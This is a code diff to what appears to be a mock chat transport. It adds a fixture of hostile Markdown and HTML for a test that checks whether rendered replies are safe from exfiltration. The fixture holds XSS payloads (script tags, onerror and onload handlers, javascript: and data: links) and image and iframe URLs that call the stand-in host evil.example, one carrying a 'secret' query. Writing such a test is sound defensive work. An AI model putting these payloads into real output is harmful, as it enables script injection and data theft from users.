@@ -6,6 +6,23 @@ const REPLY =
   "This is a placeholder reply. The assistant isn't connected yet, so every message gets this " +
   "answer, streamed a word at a time.";
 
+/**
+ * Sending exactly this gets hostile Markdown back, for the exfil-safe rendering test (M3-10 AC3).
+ * Every remote URL is on `evil.example`; every script sets `window.pwned`.
+ */
+export const MOCK_HOSTILE = "/mock hostile markdown";
+export const HOSTILE_REPLY = [
+  "## Your summary",
+  "Here is **bold**, `code` and [the docs](https://docs.example/guide).",
+  "![tracker](https://evil.example/pixel.png?q=secret) ![svg](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20onload='window.pwned=1'/%3E) ![rel](//evil.example/r.png)",
+  "[click me](javascript:window.pwned=1) [data](data:text/html,<script>window.pwned=1</script>) <https://evil.example/auto>",
+  '<img src="https://evil.example/raw.png" onerror="window.pwned=1"><script>window.pwned=1</script>',
+  '<svg onload="window.pwned=1"><image href="https://evil.example/s.png"/></svg><iframe src="https://evil.example/f"></iframe>',
+  '<a href="https://evil.example/x" style="background:url(https://evil.example/bg.png)">styled</a>',
+  "| Item | Cost |\n| --- | --- |\n| Lunch | $12 |",
+  "```html\n<img src=https://evil.example/code.png onerror=window.pwned=1>\n```",
+].join("\n\n");
+
 /** Sending exactly one of these gets that limit's refusal instead of a reply. */
 export const MOCK_LIMITS = new Map<string, TurnLimit>([
   ["/mock slow down", "slow_down"],
@@ -41,13 +58,14 @@ export function createMockTransport(delayMs = 30): ChatTransport {
       let seq = 0;
       const emit = (type: HarnessEvent["type"], payload = {}) =>
         onEvent({ v: 1, seq: ++seq, sessionId, turnId, type, payload } as HarnessEvent);
-      const words = REPLY.split(/(?<= )/);
+      const reply = text === MOCK_HOSTILE ? HOSTILE_REPLY : REPLY;
+      const words = reply.split(/(?<= )/);
       let timer: ReturnType<typeof setTimeout> | undefined;
       const tick = () => {
         const text = words.shift();
         if (text === undefined) {
           stop = null;
-          emit("message.completed", { text: REPLY });
+          emit("message.completed", { text: reply });
           return emit("turn.completed");
         }
         emit("message.delta", { text });
